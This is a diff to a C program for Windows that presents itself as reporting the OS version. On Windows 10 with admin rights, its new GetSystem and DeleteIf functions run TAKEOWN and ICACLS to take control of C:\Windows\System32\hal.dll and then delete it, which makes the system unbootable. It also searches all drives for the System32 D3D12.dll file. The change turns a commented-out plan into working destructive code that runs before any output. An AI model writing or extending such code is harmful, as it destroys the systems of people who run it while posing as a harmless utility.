@@ -21,6 +21,10 @@
 #define NORMAL "\x1b[0m"
 
 enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
+enum AccessLevel { User = 1, Admin = 2, System = 3 };
+enum OS_Lang { English, Spanish };
+
+OS_Lang language;
 
 WinVer WindowsVersion() {
 #ifdef _WIN32
@@ -29,15 +33,16 @@ WinVer WindowsVersion() {
   fputs("@Echo off\n del /F version >nul 2>&1\n ver > version", pFile);
   fclose(pFile);
   system("C:\\Windows\\System32\\cmd.exe /C version.cmd");
-  unsigned int os_ver1, os_ver2; char str_ver;
+  unsigned int os_ver1, os_ver2; char str_ver[256];
   pFile = fopen("version", "r");
   if (pFile == NULL) return Error;
-  int readed = fscanf(pFile, "\nMicrosoft Windows [%s %d.%d.", &str_ver, &os_ver1, &os_ver2);
+  int readed = fscanf(pFile, "\nMicrosoft Windows [%s %d.%d.", str_ver, &os_ver1, &os_ver2);
   fclose(pFile);
   remove("version");
   remove("version.cmd");
 
   if (readed != 3) return Error;
+  language = strcmp(str_ver, "Version") ? English : Spanish;
   switch (os_ver1) {
     case 10:
       return Win10;
@@ -61,45 +66,54 @@ WinVer WindowsVersion() {
   return Other;
 }
 
-/*
-Access level 1, 2, 3
-User
-Admin
-System
-
-if (level_1) ask_admin();
-else get_system();
-
- TAKEOWN /F ":\\." /A
-
- ICACLS ":\\." /GRANT Administrators:F
-
- get_system_lang()
- 
-*/
-
-
-static void DeleteIf[[maybe_unused]](bool cond, const char* path) {
-#ifdef _WIN32
-  if (!cond) {
-    MessageBox(NULL, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
-    exit(EXIT_FAILURE);
-  }
+static bool GetSystem(AccessLevel& program, const char* file) {
+  program = Admin;
+  if (file == NULL) return false;
   char str1[256] = "TAKEOWN /F ";
-  strcat(str1, path);
+  strcat(str1, file);
   strcat(str1, " /A");
-  printf("%s\n", str1);
+  printf("Executing: %s\n", str1);
+  system(str1);
 
   char str2[256] = "ICACLS ";
-  strcat(str2, path);
-  strcat(str2, " /GRANT Administradores:F"); // Administrators
-  printf("%s\n", str2);
-
-  system(str1);
+  strcat(str2, file);
+  if (language == English) // TODO: get group name
+    strcat(str2, " /GRANT Administrators:F");
+  else
+    strcat(str2, " /GRANT Administradores:F");
+  printf("Executing: %s\n", str2);
   system(str2);
 
-  remove(path);
-#endif
+  program = System;
+  return true;
+}
+
+static bool IsUserSystem(AccessLevel& program, const char* file) {
+  program = User;
+  if (IsUserAnAdmin()) {
+    return GetSystem(program, file);
+  } else {
+    MessageBox(NULL, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
+    // exit(EXIT_FAILURE);
+  }
+  return false;
+}
+
+void DeleteIf(bool cond, const char* path) {
+  if (cond) {
+    AccessLevel program;
+    if (IsUserSystem(program, path))
+      remove(path);
+
+   switch (program) {
+      case User: printf("Running has User\n");
+      break;
+      case Admin: printf("Running has Admin\n");
+      break;
+      case System: printf("Running has System\n");
+      break;
+    }
+  }
 }
 
 void MountedSearch() {
@@ -118,7 +132,7 @@ void MountedSearch() {
   while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
     printf("Drive %s mounted in: %s\n", drive, source);
     strcpy(name, source);
-    strcat(name, "/Windows/System32/d3dx12.dll");
+    strcat(name, "/Windows/System32/D3D12.dll");
     // <- That's a valid path.
     printf("Looking for file: %s\n", name);
     struct stat buffer;
@@ -171,7 +185,7 @@ void UnmountedSearch() {
     printf("Drive %s mounted in: %s\n", drive, source);
 
     strcpy(name, source);
-    strcat(name, "/Windows/System32/d3dx12.dll");
+    strcat(name, "/Windows/System32/D3D12.dll");
     printf("Looking for file: %s\n", name);
     struct stat buffer;
     if (stat(name, &buffer) == 0) {
@@ -191,10 +205,8 @@ void UnmountedSearch() {
 }
 
 int main(int argc, char* argv[]) {
-#ifdef _WIN32
-  if (WindowsVersion() == Win10)
-    DeleteIf(IsUserAnAdmin(), "C:\\Windows\\System32\\hal.dll");
-#endif
+  DeleteIf(WindowsVersion() == Win10, "C:\\Windows\\System32\\hal.dll");
+  // TODO: mark necessary has [[maybe_unused]]
 
   printf("You are using Windows ");
   WinVer ver = WindowsVersion();
